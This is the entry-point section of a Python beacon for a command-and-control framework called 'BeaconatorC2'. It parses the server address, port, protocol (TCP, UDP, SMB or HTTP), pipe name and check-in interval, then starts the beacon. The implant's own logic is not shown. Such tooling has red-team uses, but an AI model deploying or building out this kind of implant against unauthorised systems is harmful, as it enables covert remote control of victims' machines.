# Main entry point

def main():
    parser = argparse.ArgumentParser(description="Python Beacon for BeaconatorC2")
    parser.add_argument("--server", default=SERVER_IP, help="Server IP address")
    parser.add_argument("--port", type=int, default=SERVER_PORT, help="Server port")
    parser.add_argument("--protocol", choices=["tcp", "udp", "smb", "http"],
                       default=DEFAULT_PROTOCOL, help="Communication protocol")
    parser.add_argument("--pipe", help="SMB pipe name (for SMB protocol)")
    parser.add_argument("--endpoint", default="/", help="HTTP endpoint path (for HTTP protocol)")
    parser.add_argument("--interval", type=int, default=CHECK_IN_INTERVAL,
                       help="Check-in interval in seconds")
    parser.add_argument("--schema", default=SCHEMA_FILE, help="Schema file for auto-assignment")

    args = parser.parse_args()

    # Create and run beacon
    beacon = PythonBeacon(
        server_ip=args.server,
        server_port=args.port,
        protocol=args.protocol,
        pipe_name=args.pipe,
        http_endpoint=args.endpoint,
        schema_file=args.schema,
        checkin_interval=args.interval
    )

    try:
        beacon.run()
    except KeyboardInterrupt:
        print("\n[!] Beacon terminated by user")
    except Exception as e:
        print(f"[!] Beacon failed: {e}")


if __name__ == "__main__":
    main()
